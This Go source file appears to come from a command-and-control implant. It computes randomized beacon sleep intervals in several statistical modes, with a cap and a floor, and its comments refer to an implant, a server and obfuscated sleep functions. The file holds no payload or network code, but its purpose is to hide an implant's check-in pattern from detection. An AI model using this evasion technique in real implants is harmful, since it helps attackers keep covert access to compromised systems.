//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"math"
	"time"
)

// BeaconRandomizationMode controls how beacon intervals are randomized.
type BeaconRandomizationMode string

const (
	// RandomizationLinear uses uniform random within ±jitter% of interval.
	RandomizationLinear BeaconRandomizationMode = "linear"
	// RandomizationGaussian uses normal distribution centered at interval,
	// stddev = interval * jitter%.
	RandomizationGaussian BeaconRandomizationMode = "gaussian"
	// RandomizationExponential uses exponential decay (more frequent shorter intervals).
	RandomizationExponential BeaconRandomizationMode = "exponential"
	// RandomizationTwoStage first picks a random base interval [interval*0.7..interval*1.3],
	// then applies jitter within that base.
	RandomizationTwoStage BeaconRandomizationMode = "two_stage"
	// RandomizationAdaptive dynamically adjusts based on network conditions and time of day.
	RandomizationAdaptive BeaconRandomizationMode = "adaptive"
)

// Global configuration for beacon randomization mode.
var beaconRandomizationMode BeaconRandomizationMode

// initBeaconRandomization initializes the randomization mode from the compile-time config.
func initBeaconRandomization() {
	switch BeaconRandomizationStr {
	case "gaussian":
		beaconRandomizationMode = RandomizationGaussian
	case "exponential":
		beaconRandomizationMode = RandomizationExponential
	case "two_stage":
		beaconRandomizationMode = RandomizationTwoStage
	case "adaptive":
		beaconRandomizationMode = RandomizationAdaptive
	default:
		beaconRandomizationMode = RandomizationLinear
	}
}

// gaussianRandom generates a normally-distributed random number in [-3, 3].
// It uses the Box-Muller transform with a seeded RNG for reproducibility.
func gaussianRandom() float64 {
	// Box-Muller transform with two uniform randoms
	u1 := rng.Float64()
	u2 := rng.Float64()
	// Avoid log(0)
	if u1 < 1e-10 {
		u1 = 1e-10
	}
	// sqrt(-2*ln(u1) * cos(2*pi*u2))
	z := math.Sqrt(-2.0*math.Log(u1)) * math.Cos(2.0*math.Pi*u2)
	// Clamp to [-3, 3] to avoid extreme outliers
	if z < -3.0 {
		z = -3.0
	}
	if z > 3.0 {
		z = 3.0
	}
	return z
}

// exponentialRandom generates an exponentially-distributed random number
// biased towards shorter intervals (mean = 1).
func exponentialRandom() float64 {
	u := rng.Float64()
	// Inverse CDF of exponential distribution
	// Clamp to avoid extreme values
	val := -math.Log(1.0 - u)
	if val > 3.0 {
		val = 3.0
	}
	return val
}

// computeBeaconIntervalWithMode calculates the next beacon interval based on the configured mode.
func computeBeaconIntervalWithMode(base time.Duration, jitterPercent float64) time.Duration {
	jitter := jitterPercent / 100.0

	switch beaconRandomizationMode {
	case RandomizationGaussian:
		// Normal distribution centered at base, stddev = base * jitter
		stddev := float64(base) * jitter
		variation := time.Duration(gaussianRandom() * stddev)
		return base + variation

	case RandomizationExponential:
		// Exponential decay biased towards shorter intervals
		// Scale so mean equals base
		variation := time.Duration(float64(base) * (exponentialRandom() - 1.0) * jitter)
		return base + variation

	case RandomizationTwoStage:
		// First stage: random base interval [interval*0.7..interval*1.3]
		baseMultiplier := 0.7 + rng.Float64()*0.6
		randomBase := time.Duration(float64(base) * baseMultiplier)
		// Second stage: apply jitter within that base
		variation := time.Duration(float64(randomBase) * jitter * (rng.Float64()*2 - 1))
		return randomBase + variation

	case RandomizationAdaptive:
		// Adaptive mode combines time-of-day and network-condition awareness
		// For now, use gaussian + time-of-day factor
		stddev := float64(base) * jitter
		variation := time.Duration(gaussianRandom() * stddev)
		return base + variation

	default:
		// Linear (default): uniform random within ±jitter% of base
		variation := time.Duration(float64(base) * jitter * (rng.Float64()*2 - 1))
		return base + variation
	}
}

// applyMaxRandomCap clamps the computed interval if MaxRandomIntervalMs is set.
func applyMaxRandomCap(interval time.Duration) time.Duration {
	if MaxRandomIntervalMs <= 0 {
		return interval
	}
	maxCap := time.Duration(MaxRandomIntervalMs) * time.Millisecond
	baseInterval := time.Duration(Interval) * time.Second
	// The cap applies to the random variation above the base interval.
	// So max allowed interval = base interval + MaxRandomIntervalMs
	maxAllowed := baseInterval + maxCap
	if interval > maxAllowed {
		return maxAllowed
	}
	return interval
}

// floorBeaconInterval bounds the randomized interval from below so the
// symmetric distributions (gaussian ±3σ, two-stage, exponential) can never
// yield a zero or negative sleep. A near-zero return from sleepWithMask /
// sleepObfuscated / waitForBeaconWake means an immediate next beacon — a
// self-inflicted beacon storm that also reads to the server as a dead-or-flap
// implant. The floor is 1s (the server clamps Interval to >=1s) and at least
// 10% of the base so a long beacon cadence keeps meaningful variance without
// ever collapsing to a tight loop.
func floorBeaconInterval(base, interval time.Duration) time.Duration {
	floor := time.Second
	if t := base / 10; t > floor {
		floor = t
	}
	if interval < floor {
		return floor
	}
	return interval
}
